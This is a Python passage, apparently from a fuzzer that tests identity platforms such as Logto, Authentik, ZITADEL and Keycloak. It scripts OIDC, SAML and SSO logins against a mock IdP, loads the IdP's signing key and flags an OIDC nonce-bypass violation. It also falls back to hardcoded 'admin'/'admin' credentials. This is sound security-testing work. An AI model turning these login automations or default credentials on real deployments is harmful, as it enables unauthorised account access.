                key = load_pem_private_key(data["key_pem"].encode(), password=None)
                cert = load_pem_x509_certificate(data["cert_pem"].encode())
                return key, cert
            else:
                logger.info(f"    SAML-KEY: mock-idp /saml/key returned {resp.status_code}, trying file fallback")
        except Exception as e:
            logger.info(f"    SAML-KEY: mock-idp /saml/key unavailable ({e}), trying file fallback")

        # Strategy 2: load from file paths in profile metadata
        key_path = _meta.get("saml_idp_key_path", "")
        cert_path = _meta.get("saml_idp_cert_path", "")
        if key_path and cert_path:
            # Resolve relative paths against fuzzer directory
            fuzzer_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            abs_key = os.path.join(fuzzer_dir, key_path) if not os.path.isabs(key_path) else key_path
            abs_cert = os.path.join(fuzzer_dir, cert_path) if not os.path.isabs(cert_path) else cert_path
            if os.path.isfile(abs_key) and os.path.isfile(abs_cert):
                try:
                    with open(abs_key, "rb") as f:
                        key = load_pem_private_key(f.read(), password=None)
                    with open(abs_cert, "rb") as f:
                        cert = load_pem_x509_certificate(f.read())
                    logger.info(f"    SAML-KEY: loaded trusted IdP key from {abs_key}")
                    return key, cert
                except Exception as e:
                    logger.warning(f"    SAML-KEY: failed to load key from file: {e}")
            else:
                logger.info(f"    SAML-KEY: key/cert files not found at {abs_key}, {abs_cert}")

        logger.warning("    SAML-KEY: no trusted IdP key available (mock-idp and file both failed)")
        return None, None

    # ------------------------------------------------------------------
    # Experience API login (multi-step OIDC auth for platforms without ROPC)
    # ------------------------------------------------------------------

    def _experience_api_login(self, event: "Event", endpoint, resolved_params: dict) -> "EventResult":
        """Authenticate a user via the platform's Experience/Interaction API.

        Platforms that don't support ROPC (Resource Owner Password Credentials)
        require multi-step browser-like flows.  This method simulates:

        1. Start OIDC auth request → capture interaction session
        2. Initialize sign-in interaction
        3. Submit username/password via identification API
        4. Complete interaction → extract auth code from redirect
        5. Exchange auth code for access token

        Returns an EventResult as if login_with_password had succeeded directly.
        """
        import requests as _req
        from urllib.parse import urlparse, parse_qs

        username = resolved_params.get("username", "")
        password = resolved_params.get("password", "")
        _pc = getattr(self, '_persistent_captures', {})
        _env = (self.profile.environment_defaults or {}) if self.profile else {}
        client_id = (resolved_params.get("client_id")
                     or _pc.get("test_app_client_id")
                     or _env.get("test_app_client_id", ""))
        client_secret = (resolved_params.get("client_secret")
                         or _pc.get("test_app_client_secret")
                         or _env.get("test_app_client_secret", ""))
        redirect_uri = (resolved_params.get("redirect_uri")
                        or _pc.get("redirect_uri")
                        or _env.get("redirect_uri", "http://localhost:9090/callback"))
        resource = (resolved_params.get("resource")
                    or _pc.get("test_api_resource")
                    or _env.get("test_api_resource", "")
                    or self.captures.get("test_api_resource", ""))
        scope = resolved_params.get("scope", "openid offline_access profile email")

        session = _req.Session()
        base = self.base_url

        try:
            # Step 1: Start OIDC auth → capture interaction cookie
            auth_params = {
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "response_type": "code",
                "scope": scope,
                "prompt": "login",
            }
            if resource:
                auth_params["resource"] = resource
            resp = session.get(f"{base}/oidc/auth", params=auth_params,
                               allow_redirects=True, timeout=15)
            logger.info(f"    EXPERIENCE: auth started → {resp.status_code} "
                        f"(resource={resource or 'NONE'}, "
                        f"cookies={list(session.cookies.keys())})")

            # Step 2: Initialize sign-in experience
            resp = session.put(f"{base}/api/experience",
                               json={"interactionEvent": "SignIn"}, timeout=10)
            if resp.status_code not in (200, 201, 204):
                logger.warning(f"    EXPERIENCE: init failed → {resp.status_code} {resp.text[:200]}")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False, error=f"Experience init: {resp.status_code}")

            # Step 3: Verify password → get verificationId, then identify
            resp = session.post(f"{base}/api/experience/verification/password",
                                json={"identifier": {"type": "username", "value": username},
                                      "password": password},
                                timeout=10)
            if resp.status_code not in (200, 201):
                logger.warning(f"    EXPERIENCE: password verification failed → "
                               f"{resp.status_code} {resp.text[:200]}")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False,
                                   error=f"Experience verification: {resp.status_code}")

            verification_id = ""
            try:
                verification_id = resp.json().get("verificationId", "")
            except Exception:
                pass

            if verification_id:
                resp = session.post(f"{base}/api/experience/identification",
                                    json={"verificationId": verification_id},
                                    timeout=10)
                if resp.status_code not in (200, 201, 204):
                    logger.warning(f"    EXPERIENCE: identification failed → "
                                   f"{resp.status_code} {resp.text[:200]}")
                    return EventResult(event=event, http_status=resp.status_code,
                                       response_body={"error": resp.text[:500]},
                                       success=False,
                                       error=f"Experience identification: {resp.status_code}")

            # Step 4: Submit interaction → follow redirect chain to get auth code
            resp = session.post(f"{base}/api/experience/submit",
                                json={}, timeout=10)
            if not resp.ok:
                logger.warning(f"    EXPERIENCE: submit failed → {resp.status_code} {resp.text[:200]}")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False, error=f"Experience submit: {resp.status_code}")

            redirect_to = ""
            try:
                redirect_to = resp.json().get("redirectTo", "")
            except Exception:
                pass

            # Follow redirect chain (consent, OIDC finalization) until we get the code
            code = ""
            from urllib.parse import urljoin
            loc = redirect_to
            for _hop in range(8):
                if not loc:
                    break
                # Check if this URL has the auth code (callback URL)
                _qs = parse_qs(urlparse(loc).query)
                if "code" in _qs:
                    code = _qs["code"][0]
                    logger.info(f"    EXPERIENCE: auth code found at hop {_hop}")
                    break
                # Follow redirect
                if not loc.startswith("http"):
                    loc = urljoin(f"{base}/", loc)
                _r = session.get(loc, allow_redirects=False, timeout=10)
                loc = _r.headers.get("Location", "")

            if not code:
                logger.warning(f"    EXPERIENCE: no auth code after redirect chain")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"redirectTo": redirect_to},
                                   success=False, error="No auth code in redirect chain")

            logger.info(f"    EXPERIENCE: auth code obtained ({code[:20]}...)")

            # Step 5: Exchange code for tokens
            token_resp = session.post(f"{base}/oidc/token", data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": redirect_uri,
                "client_id": client_id,
                "client_secret": client_secret,
            }, timeout=15)

            if token_resp.ok:
                token_data = token_resp.json()
                access_token = token_data.get("access_token", "")
                logger.info(f"    EXPERIENCE: login succeeded for '{username}' "
                            f"(token={access_token[:30]}...)")
                return EventResult(
                    event=event,
                    http_status=200,
                    response_body=token_data,
                    success=True,
                )
            else:
                logger.warning(f"    EXPERIENCE: token exchange failed → "
                               f"{token_resp.status_code} {token_resp.text[:200]}")
                return EventResult(event=event, http_status=token_resp.status_code,
                                   response_body={"error": token_resp.text[:500]},
                                   success=False,
                                   error=f"Token exchange: {token_resp.status_code}")

        except Exception as e:
            logger.error(f"    EXPERIENCE: login error: {e}")
            return EventResult(event=event, http_status=500,
                               response_body={"error": str(e)},
                               success=False, error=str(e))

    def _experience_sso_login(self, event: "Event", endpoint, resolved_params: dict,
                               connector_id: str) -> "EventResult":
        """Authenticate via SSO connector through the Experience API.

        Multi-step flow:
        1. Start OIDC auth → capture interaction session
        2. Initialize sign-in experience
        3. Request SSO authorization URL for the connector
        4. Follow redirect to mock-idp (auto-authenticates)
        5. Complete SSO authentication with callback data
        6. Submit interaction → get auth code
        7. Exchange auth code for tokens
        """
        import requests as _req
        from urllib.parse import urlparse, parse_qs, urlencode, urljoin

        _pc = getattr(self, '_persistent_captures', {})
        _env = (self.profile.environment_defaults or {}) if self.profile else {}
        client_id = (resolved_params.get("client_id")
                     or _pc.get("test_app_client_id")
                     or _env.get("test_app_client_id", ""))
        client_secret = (resolved_params.get("client_secret")
                         or _pc.get("test_app_client_secret")
                         or _env.get("test_app_client_secret", ""))
        redirect_uri = (resolved_params.get("redirect_uri")
                        or _pc.get("redirect_uri")
                        or _env.get("redirect_uri", "http://localhost:9090/callback"))
        resource = (resolved_params.get("resource")
                    or _pc.get("test_api_resource")
                    or _env.get("test_api_resource", ""))
        scope = resolved_params.get("scope", "openid offline_access profile email")

        session = _req.Session()
        base = self.base_url

        try:
            # Step 1: Start OIDC auth
            auth_params = {
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "response_type": "code",
                "scope": scope,
                "prompt": "login",
            }
            if resource:
                auth_params["resource"] = resource
            resp = session.get(f"{base}/oidc/auth", params=auth_params,
                               allow_redirects=True, timeout=15)

            # Step 2: Initialize sign-in
            resp = session.put(f"{base}/api/experience",
                               json={"interactionEvent": "SignIn"}, timeout=10)
            if resp.status_code not in (200, 201, 204):
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False, error=f"Experience init: {resp.status_code}")

            # Step 3: Get SSO authorization URL
            sso_state = f"valence-sso-{id(self)}"
            sso_redirect = redirect_uri
            resp = session.post(
                f"{base}/api/experience/verification/sso/{connector_id}/authorization-uri",
                json={"redirectUri": sso_redirect,
                      "state": sso_state},
                timeout=10)
            if not resp.ok:
                # Try alternative path formats
                for _alt_path in [
                    f"/api/experience/sso/{connector_id}/authorization-url",
                    f"/api/experience/sso/authorization-url",
                ]:
                    resp = session.post(
                        f"{base}{_alt_path}",
                        json={"connectorId": connector_id,
                              "redirectUri": sso_redirect, "state": sso_state},
                        timeout=10)
                    if resp.ok:
                        break
            if not resp.ok:
                logger.warning(f"    SSO-EXP: authorization-url failed → {resp.status_code} {resp.text[:200]}")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False, error=f"SSO auth-url: {resp.status_code}")

            _sso_resp = resp.json()
            auth_url = _sso_resp.get("authorizationUri") or _sso_resp.get("authorizationUrl", "")
            _sso_verification_id = _sso_resp.get("verificationId", "")
            if not auth_url:
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body=_sso_resp,
                                   success=False, error="No authorizationUri returned")

            # Rewrite Docker-internal hostnames to localhost for host-side access
            _mock_host = (self.captures.get("mock_idp_host_url")
                          or (_env.get("mock_idp_host_url", "http://localhost:9090")))
            if "://mock-idp:" in auth_url:
                auth_url = auth_url.replace("http://mock-idp:9090", _mock_host)
            elif "://mock-idp:" in auth_url:
                auth_url = auth_url.replace("http://mock-idp:9090", _mock_host)
            logger.info(f"    SSO-EXP: redirecting to IdP → {auth_url[:80]}...")

            # Step 4: Follow to mock-idp (it auto-authenticates and redirects back)
            idp_resp = session.get(auth_url, allow_redirects=False, timeout=10)
            callback_url = idp_resp.headers.get("Location", "")
            idp_data = {}

            if idp_resp.status_code == 200 and "<form" in idp_resp.text:
                # SAML POST binding: IdP returns HTML form with SAMLResponse
                import re as _re
                _action = _re.search(r'action="([^"]+)"', idp_resp.text)
                _saml_resp = _re.search(r'name="SAMLResponse"\s+value="([^"]+)"', idp_resp.text)
                _relay = _re.search(r'name="RelayState"\s+value="([^"]*)"', idp_resp.text)
                if _action and _saml_resp:
                    acs_url = _action.group(1)
                    saml_response = _saml_resp.group(1)
                    relay_state_val = _relay.group(1) if _relay else ""
                    logger.info(f"    SSO-EXP: SAML POST binding → ACS={acs_url[:60]}...")
                    acs_resp = session.post(acs_url,
                                           data={"SAMLResponse": saml_response,
                                                  "RelayState": relay_state_val},
                                           allow_redirects=False, timeout=15)
                    logger.info(f"    SSO-EXP: ACS response {acs_resp.status_code}")
                    # For SAML, idp_data carries RelayState + state for the /verify call
                    idp_data = {"RelayState": relay_state_val, "state": sso_state}
                else:
                    logger.warning(f"    SSO-EXP: SAML form parse failed")

            elif callback_url:
                # OIDC-style redirect with code/state
                cb_qs = parse_qs(urlparse(callback_url).query)
                idp_data = {k: v[0] for k, v in cb_qs.items()}
            else:
                return EventResult(event=event, http_status=idp_resp.status_code,
                                   response_body={"error": "IdP did not redirect or return form"},
                                   success=False, error="IdP no response")

            logger.info(f"    SSO-EXP: IdP callback data keys: {list(idp_data.keys())}")

            # Step 5: Complete SSO verification
            # For SAML: ACS processes the SAMLResponse, then /verify reads the result.
            # For OIDC: /verify exchanges the auth code with the IdP.
            resp = session.post(
                f"{base}/api/experience/verification/sso/{connector_id}/verify",
                json={"verificationId": _sso_verification_id,
                      "connectorData": idp_data},
                timeout=15)
            if not resp.ok:
                logger.warning(f"    SSO-EXP: verify failed → {resp.status_code} {resp.text[:300]}")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False, error=f"SSO verify: {resp.status_code}")

            _verify_vid = ""
            try:
                _verify_vid = resp.json().get("verificationId", _sso_verification_id)
            except Exception:
                _verify_vid = _sso_verification_id
            logger.info(f"    SSO-EXP: verify succeeded (vid={_verify_vid})")
            # L1 auto-detect for OIDC SSO nonce bypass: verify accepted means the RP
            # accepted the id_token without nonce — this is the exact point of the bug.
            # Detect here (not at final token exchange) so DNS/network issues don't mask it.
            if (resolved_params.get("mutation_type") == "i2_oidc_sso_nonce_bypass"
                    and connector_id == self.captures.get("oidc_sso_connector_id", "")):
                from src.models.types import Verdict, VerdictType
                _v = Verdict(
                    invariant="I2",
                    verdict_type=VerdictType.VIOLATION,
                    confidence="HIGH",
                    description=(
                        "OIDC SSO verify accepted id_token without nonce claim. "
                        "The mock IdP omits nonce by default; per OIDC Core 3.1.3.7 §11, "
                        "the RP must reject id_tokens with missing nonce when nonce was "
                        "sent in the authorization request. Nonce validation bypassed."
                    ),
                    evidence={"connector_id": connector_id,
                              "mutation_type": "i2_oidc_sso_nonce_bypass"},
                    spec_reference="OpenID Connect Core 1.0 §3.1.3.7",
                )
                if hasattr(self, 'syntactic_verdicts'):
                    self.syntactic_verdicts.append(_v)

            # Identify with SSO verification
            resp = session.post(f"{base}/api/experience/identification",
                                json={"verificationId": _verify_vid}, timeout=10)
            if resp.status_code == 404 and "sso_identity_not_exist" in resp.text:
                # First-time SSO user: switch to Register, re-init auth URI + ACS + verify
                logger.info("    SSO-EXP: new SSO user, switching to Register flow")
                session.put(f"{base}/api/experience",
                            json={"interactionEvent": "Register"}, timeout=10)
                # Get new authorization URI
                _reg_resp = session.post(
                    f"{base}/api/experience/verification/sso/{connector_id}/authorization-uri",
                    json={"redirectUri": redirect_uri, "state": sso_state},
                    timeout=10)
                if _reg_resp.ok:
                    _reg_data = _reg_resp.json()
                    _reg_vid = _reg_data.get("verificationId", "")
                    _reg_auth = _reg_data.get("authorizationUri", "")
                    if "mock-idp:" in _reg_auth:
                        _reg_auth = _reg_auth.replace("http://mock-idp:9090", _mock_host)
                    elif "mock-idp:" in _reg_auth:
                        _reg_auth = _reg_auth.replace("http://mock-idp:9090", _mock_host)
                    # Re-do IdP + ACS
                    import re as _re2
                    _rl2 = None  # initialize before conditional assignment
                    _reg_connector_data: dict = {"state": sso_state}
                    _reg_idp = session.get(_reg_auth, allow_redirects=False, timeout=10)
                    if _reg_idp.status_code == 200 and "<form" in _reg_idp.text:
                        # SAML: POST SAMLResponse to ACS, then re-verify with RelayState
                        _a2 = _re2.search(r'action="([^"]+)"', _reg_idp.text)
                        _sr2 = _re2.search(r'name="SAMLResponse"\s+value="([^"]+)"', _reg_idp.text)
                        _rl2 = _re2.search(r'name="RelayState"\s+value="([^"]*)"', _reg_idp.text)
                        if _a2 and _sr2:
                            session.post(_a2.group(1),
                                         data={"SAMLResponse": _sr2.group(1),
                                               "RelayState": _rl2.group(1) if _rl2 else ""},
                                         allow_redirects=False, timeout=15)
                        _reg_connector_data = {"RelayState": _rl2.group(1) if _rl2 else "",
                                               "state": sso_state}
                    elif _reg_idp.headers.get("Location"):
                        # OIDC: follow redirect to get code/state, re-verify with those
                        _cb_qs2 = parse_qs(urlparse(_reg_idp.headers["Location"]).query)
                        idp_data = {k: v[0] for k, v in _cb_qs2.items()}
                        _reg_connector_data = idp_data
                    # Re-verify
                    resp = session.post(
                        f"{base}/api/experience/verification/sso/{connector_id}/verify",
                        json={"verificationId": _reg_vid,
                              "connectorData": _reg_connector_data},
                        timeout=15)
                    if resp.ok:
                        _verify_vid = resp.json().get("verificationId", _reg_vid)
                resp = session.post(f"{base}/api/experience/identification",
                                    json={"verificationId": _verify_vid}, timeout=10)
                if resp.status_code in (200, 201, 204):
                    logger.info("    SSO-EXP: SSO registration succeeded")
            if resp.status_code not in (200, 201, 204):
                logger.warning(f"    SSO-EXP: identification failed → {resp.status_code} {resp.text[:200]}")

            # Step 6: Submit interaction → follow redirect chain to get auth code
            resp = session.post(f"{base}/api/experience/submit", json={}, timeout=10)
            if not resp.ok:
                logger.warning(f"    SSO-EXP: submit failed → {resp.status_code} {resp.text[:200]}")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"error": resp.text[:500]},
                                   success=False, error=f"Submit: {resp.status_code}")

            redirect_to = ""
            try:
                redirect_to = resp.json().get("redirectTo", "")
            except Exception:
                pass

            code = ""
            loc = redirect_to
            for _hop in range(8):
                if not loc:
                    break
                _qs = parse_qs(urlparse(loc).query)
                if "code" in _qs:
                    code = _qs["code"][0]
                    logger.info(f"    SSO-EXP: auth code found at hop {_hop}")
                    break
                if not loc.startswith("http"):
                    loc = urljoin(f"{base}/", loc)
                _r = session.get(loc, allow_redirects=False, timeout=10)
                loc = _r.headers.get("Location", "")

            if not code:
                logger.warning(f"    SSO-EXP: no auth code after redirect chain (from: {redirect_to[:100]})")
                return EventResult(event=event, http_status=resp.status_code,
                                   response_body={"redirectTo": redirect_to},
                                   success=False, error="No auth code")

            # Step 7: Exchange code for token
            token_resp = session.post(f"{base}/oidc/token", data={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": redirect_uri,
                "client_id": client_id,
                "client_secret": client_secret,
            }, timeout=15)

            if token_resp.ok:
                token_data = token_resp.json()
                logger.info(f"    SSO-EXP: SSO login succeeded via connector {connector_id}")
                return EventResult(event=event, http_status=200,
                                   response_body=token_data, success=True)
            else:
                return EventResult(event=event, http_status=token_resp.status_code,
                                   response_body={"error": token_resp.text[:500]},
                                   success=False,
                                   error=f"Token exchange: {token_resp.status_code}")

        except Exception as e:
            logger.error(f"    SSO-EXP: error: {e}")
            return EventResult(event=event, http_status=500,
                               response_body={"error": str(e)},
                               success=False, error=str(e))

    def _resolve_admin_token(self, auth_value_template: str) -> str:
        """Resolve dynamic admin token using profile's admin_auth.resolver config.

        Supported resolver types:
          - "ropc": Resource Owner Password Credentials grant (Keycloak)
          - "client_credentials": Client Credentials grant (Logto, Zitadel)
        When no resolver is configured, falls back to Keycloak-style ROPC on
        /realms/master/... for backward compatibility with existing profiles.
        """
        if hasattr(self, '_cached_admin_token') and self._cached_admin_token:
            return auth_value_template.replace("{admin_token}", self._cached_admin_token)

        resolver = (self.profile.admin_auth.get("resolver") if self.profile else None) or {}
        resolver_type = resolver.get("type", "")

        try:
            if resolver_type == "ropc":
                # Config-driven ROPC grant
                token_url = f"{self.base_url}{resolver['token_url']}"
                data = {k: v for k, v in resolver.items()
                        if k not in ("type", "token_url")}
                data.setdefault("grant_type", "password")
                resp = self.session.post(token_url, data=data)
            elif resolver_type == "client_credentials":
                # Config-driven client_credentials grant
                token_url = f"{self.base_url}{resolver['token_url']}"
                data = {
                    "grant_type": "client_credentials",
                    "client_id": resolver.get("client_id", ""),
                    "client_secret": resolver.get("client_secret", ""),
                }
                if resolver.get("resource"):
                    data["resource"] = resolver["resource"]
                if resolver.get("scope"):
                    data["scope"] = resolver["scope"]
                resp = self.session.post(token_url, data=data)
            else:
                # on /realms/master/protocol/openid-connect/token.
                resp = self.session.post(
                    f"{self.base_url}/realms/master/protocol/openid-connect/token",
                    data={
                        "grant_type": "password",
                        "client_id": "admin-cli",
                        "username": "admin",
                        "password": "admin",
                    },
                )

            if resp.ok:
                self._cached_admin_token = resp.json()["access_token"]
                return auth_value_template.replace("{admin_token}", self._cached_admin_token)
        except Exception as e:
            logger.error(f"Failed to resolve admin token: {e}")

        return auth_value_template  # Fallback: return unresolved

    # ------------------------------------------------------------------
    # ------------------------------------------------------------------

    def _authentik_discovery_cache(self) -> dict:
        """Lazy-load and cache authentik flow UUIDs and signing key UUID."""
        if hasattr(self, '_ak_cache') and self._ak_cache:
            return self._ak_cache

        cache = {}
        headers = {}
        auth_header = self.profile.admin_auth.get("header", "Authorization")
        auth_value = self.profile.admin_auth.get("value", "")
        if "{admin_token}" in auth_value:
            auth_value = self._resolve_admin_token(auth_value)
        headers[auth_header] = auth_value

        try:
            # Discover flows by designation
            resp = self.session.get(
                f"{self.base_url}/api/v3/flows/instances/",
                headers=headers, timeout=10)
            if resp.ok:
                for f in resp.json().get("results", []):
                    slug = f.get("slug", "")
                    pk = f.get("pk", "")
                    designation = f.get("designation", "")
                    if designation == "authorization" and "implicit-consent" in slug:
                        cache["authorization_flow"] = pk
                    elif designation == "authorization" and "authorization_flow" not in cache:
                        cache["authorization_flow"] = pk
                    elif designation == "invalidation" and "provider" in slug:
                        cache["invalidation_flow"] = pk
                    elif designation == "invalidation" and "invalidation_flow" not in cache:
                        cache["invalidation_flow"] = pk
                    elif designation == "authentication" and "source" in slug:
                        cache["source_authentication_flow"] = pk
                    elif designation == "authentication" and "authentication_flow" not in cache:
                        cache["authentication_flow"] = pk
                    elif designation == "enrollment" and "source" in slug:
                        cache["source_enrollment_flow"] = pk
                    # pre-authentication flow — match by slug or designation
                    if "pre-authentication" in slug or designation == "stage_configuration":
                        if "source_pre_authentication_flow" not in cache:
                            cache["source_pre_authentication_flow"] = pk
                logger.info(f"    AUTHENTIK: discovered {len(cache)} flow UUIDs")
        except Exception as e:
            logger.warning(f"    AUTHENTIK: flow discovery failed: {e}")

        try:
            # Discover signing key
            resp = self.session.get(
                f"{self.base_url}/api/v3/crypto/certificatekeypairs/",
                headers=headers, timeout=10)
            if resp.ok:
                for k in resp.json().get("results", []):
                    cache["signing_key"] = k["pk"]
                    break  # Use first available key
                logger.info(f"    AUTHENTIK: discovered signing_key")
        except Exception as e:
            logger.warning(f"    AUTHENTIK: crypto key discovery failed: {e}")

        self._ak_cache = cache
        return cache

    @staticmethod
    def _looks_like_uuid(val: str) -> bool:
        """Check if a string looks like a UUID (8-4-4-4-12 hex pattern)."""
        if not val or len(val) < 32:
            return False
        import re
        return bool(re.match(
            r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            val, re.IGNORECASE))

    @staticmethod
    def _looks_like_authentik_client_id(val: str) -> bool:
        """Authentik auto-generated client_ids are 40-char alphanumeric strings."""
        if not val:
            return False
        return len(val) >= 30 and val.isalnum()

    def _authentik_resolve_client_credentials(self) -> tuple:
        """Resolve real client_id/client_secret from authentik providers.

        Looks up providers created during this sequence via the admin API
        and returns (client_id, client_secret) of the first found.
        Falls back to captures if available.
        """
        # First check captures from create_organization events — trust any
        # non-empty value since it was accepted by the platform when created.
        for key in ("client_id", "provider_client_id"):
            _cval = str(self.captures.get(key, "")).strip()
            if _cval and _cval not in ("None", "null", ""):
                cs_key = key.replace("client_id", "client_secret")
                return _cval, self.captures.get(cs_key, "")

        try:
            headers = {}
            auth_header = self.profile.admin_auth.get("header", "Authorization")
            auth_value = self.profile.admin_auth.get("value", "")
            if "{admin_token}" in auth_value:
                auth_value = self._resolve_admin_token(auth_value)
            headers[auth_header] = auth_value

            resp = self.session.get(
                f"{self.base_url}/api/v3/providers/oauth2/",
                headers=headers, timeout=10)
            if resp.ok:
                providers = resp.json().get("results", [])
                for p in providers:
                    cid = p.get("client_id", "")
                    cs = p.get("client_secret", "")
                    name = p.get("name", "")
                    # Skip the test provider we used for manual testing
                    if cid and cs:
                        logger.info(f"    AUTHENTIK: found provider '{name}' with client_id={cid[:20]}...")
                        return cid, cs
        except Exception as e:
            logger.warning(f"    AUTHENTIK: provider lookup failed: {e}")

        return "", ""

    def _ensure_admin_session(self, force=False):
        """Delegate to PlatformInitializer for cookie-auth session setup."""
        if self._platform_initializer is None:
            from src.stateful.platform_initializer import PlatformInitializer
            self._platform_initializer = PlatformInitializer(
                profile=self.profile,
                base_url=self.base_url,
                session=self.session,
                protocol=self.protocol,
            )
        self._platform_initializer.ensure_admin_session(force=force)

    def _get_session_token(self, auth_as: str) -> Optional[str]:
        """Resolve session token for profile-mode requests."""
        if auth_as == "admin":
            return None  # Admin uses profile.admin_auth, not session token
        if auth_as.startswith("session_"):
            return self.tokens.get(auth_as, "")
        return self.tokens.get(f"session_{auth_as}", "")

    # ------------------------------------------------------------------
    # ------------------------------------------------------------------
    def _zitadel_idp_intent_to_session(self, idp_intent_id, idp_intent_token, event):
        """After a successful JWT IdP login, retrieve the intent result
        and store user_id in captures for oracle assertions.

        The key signal is whether
        complete_jwt_idp_login returned 200 (accepted) or 400 (rejected).
        This helper enriches captures with the linked user_id if available.
        """
        admin_hdr = {
            self.profile.admin_auth["header"]: self.profile.admin_auth["value"],
            "Content-Type": "application/json",
        }
        _prefix = event.auth_as or ""

        try:
            _ret_resp = requests.post(
                f"{self.base_url}/v2/idp_intents/{idp_intent_id}",
                headers=admin_hdr,
                json={"idpIntentId": idp_intent_id, "idpIntentToken": idp_intent_token},
                timeout=15,
            )
            if _ret_resp.ok:
                _ret_data = _ret_resp.json()
                _user_id = _ret_data.get("userId", "")
                if _user_id:
                    self.captures[f"{_prefix}_linked_user_id"] = _user_id
                    self.captures[f"{_prefix}_entity_id"] = _user_id
                    logger.info(f"    JWT-IDP-RETRIEVE: user_id={_user_id}")
        except Exception as e:
            logger.info(f"    JWT-IDP-RETRIEVE: error: {e}")

        return None

    # ------------------------------------------------------------------
    def _zitadel_programmatic_oidc_login(self, redirect_location, event, resolved_params, http_session, headers):
        """Complete OIDC authorization on ZITADEL without a browser.

        ZITADEL lacks password grant.  Its /oauth/v2/authorize returns a 302
        to the login UI with an ``authRequest`` query parameter.  This helper:

        1. Extracts the authRequest ID from the redirect Location.
        2. Creates or reuses a ZITADEL user (create_user via admin API).
        3. Creates a session with user + password check via POST /v2/sessions.
        4. Finalizes the auth request via POST /v2/oidc/auth_requests/{id}
           using the login-client PAT (which has ``session.link`` permission).
        5. Extracts the auth code from the returned ``callbackUrl``.

        Returns an EventResult on success, or None to fall through to the
        generic redirect handler.  This method is ONLY called when
        ``profile.name == "zitadel"`` so it cannot affect other platforms.
        """
        from urllib.parse import urlparse, parse_qs
        import re as _re

        _qs = parse_qs(urlparse(redirect_location).query)
        auth_request_id = (_qs.get("authRequest") or [None])[0]
        if not auth_request_id:
            _m = _re.search(r'authRequest=([^&]+)', redirect_location)
            auth_request_id = _m.group(1) if _m else None
        if not auth_request_id:
            logger.warning("    ZITADEL-LOGIN: no authRequest in redirect, falling back")
            return None

        logger.info(f"    ZITADEL-LOGIN: authRequest={auth_request_id}")

        admin_hdr = {
            self.profile.admin_auth["header"]: self.profile.admin_auth["value"]
        }

        # Resolve user credentials from event params or defaults
        _username = resolved_params.get("login_hint") or resolved_params.get("username")
        _password = resolved_params.get("password")
        _user_id = resolved_params.get("user_id")

        # If no credentials in params, use/create a default test user
        if not _username:
            import hashlib as _hl
            _suffix = _hl.md5(event.auth_as.encode()).hexdigest()[:6]
            _username = f"vl-{_suffix}"
        if not _password:
            _password = "ValenceTest1!"

        # Ensure user exists (idempotent)
        if not _user_id:
            _create_resp = requests.post(
                f"{self.base_url}/v2/users/human",
                headers={**admin_hdr, "Content-Type": "application/json"},
                json={
                    "username": _username,
                    "profile": {
                        "givenName": "Valence", "familyName": event.auth_as[:30],
                        "displayName": _username,
                    },
                    "email": {"email": f"{_username}@valence.test", "isVerified": True},
                    "password": {"password": _password, "changeRequired": False},
                },
                timeout=15,
            )
            if _create_resp.status_code in (200, 201):
                _user_id = _create_resp.json().get("userId", "")
                logger.info(f"    ZITADEL-LOGIN: created user {_username} (id={_user_id})")
            elif "already" in _create_resp.text.lower():
                logger.info(f"    ZITADEL-LOGIN: user {_username} already exists")
            else:
                logger.warning(f"    ZITADEL-LOGIN: user creation failed: {_create_resp.text[:200]}")

        # Step 1: Create session with user + password check
        _sess_resp = requests.post(
            f"{self.base_url}/v2/sessions",
            headers={**admin_hdr, "Content-Type": "application/json"},
            json={
                "checks": {
                    "user": {"loginName": _username},
                    "password": {"password": _password},
                }
            },
            timeout=15,
        )
        if _sess_resp.status_code not in (200, 201):
            logger.warning(f"    ZITADEL-LOGIN: CreateSession failed: {_sess_resp.text[:200]}")
            return None

        _sess_data = _sess_resp.json()
        _session_id = _sess_data.get("sessionId", "")
        _session_token = _sess_data.get("sessionToken", "")
        if not _session_id or not _session_token:
            logger.warning("    ZITADEL-LOGIN: no sessionId/sessionToken in response")
            return None
        logger.info(f"    ZITADEL-LOGIN: session created id={_session_id}")

        # Step 2: Finalize auth request → get callback URL with code.
        # Admin PAT has IAM_LOGIN_CLIENT role (granted during --setup-platform)
        # which provides session.link permission needed by CreateCallback.
        _callback_body = {
            "session": {"sessionId": _session_id, "sessionToken": _session_token}
        }

        # CreateCallback requires session.link permission.
        # The admin SA is granted IAM_LOGIN_CLIENT during --setup-platform,
        # so the admin PAT works directly — no separate login-client PAT needed.
        _cb_resp = requests.post(
            f"{self.base_url}/v2/oidc/auth_requests/{auth_request_id}",
            headers={**admin_hdr, "Content-Type": "application/json"},
            json=_callback_body,
            timeout=15,
        )

        if _cb_resp.status_code not in (200, 201):
            logger.warning(f"    ZITADEL-LOGIN: CreateCallback failed: {_cb_resp.text[:200]}")
            return None

        _callback_url = _cb_resp.json().get("callbackUrl", "")
        _cb_qs = parse_qs(urlparse(_callback_url).query)
        _code = (_cb_qs.get("code") or [None])[0]
        if not _code:
            logger.warning(f"    ZITADEL-LOGIN: no code in callbackUrl: {_callback_url[:200]}")
            return None

        logger.info(f"    ZITADEL-LOGIN: auth code obtained ({_code[:20]}...)")
        response_body = {"auth_code": _code, "redirect_location": _callback_url}
        return EventResult(
            event=event, http_status=200, response_body=response_body,
            success=True, error=""
        )

    def _extract_jwt_claims(self, auth_as: str, token: str):
